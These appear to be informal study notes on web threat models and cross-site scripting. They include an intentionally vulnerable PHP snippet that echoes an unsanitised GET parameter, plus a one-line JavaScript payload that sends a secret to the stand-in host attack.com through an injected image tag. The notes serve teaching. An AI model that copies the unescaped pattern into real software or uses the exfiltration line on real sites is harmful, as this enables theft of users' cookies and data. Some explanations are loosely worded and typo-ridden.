## Web thread models
Web attacker make website `attacker.com`. With this website, the attacker can
trick you into going to this website through phishing, text, etc. So compare to
network and malware attack, web attack might seems the least threatening. However,
web attack is the most accessible! Simply, when visiting the attacker.com, the
attacker can redirect the user to another normal webpage with a different referrer.
This referrer is already under the control of the attacker due to cross-site scripting
(XSS).
```javasript
<?php

echo "<H1>Welcome to the XSS world</H1>";
echo "<p>current User: ".$_GET['user']."</p>";

?>
```
One can easily see that the user from GET request could contain javscript which
could execute anything! A typical pattern of an attack would be:
1. Visit attack.com
2. redirect to victim.com server
3. click on link
4. victim.com send user valuable information back
5. valuable data is redirected to attack.com!
The attack involve the participation of client to redirect the information back
to attack.com. The most important step is 5. Here is an example:
```javscript
document.body.innerHTML += "<img src='attack.com?secret="+vimtim_secret+"'>"
```
Another pattern would be:
1. attack.com inject script to victim.com
2. victim visits victim.com
3. victim get inject script from victim.com
4. victim execute the injected script with their cookie (oh no..)
5. victim's data get sent to attack.com
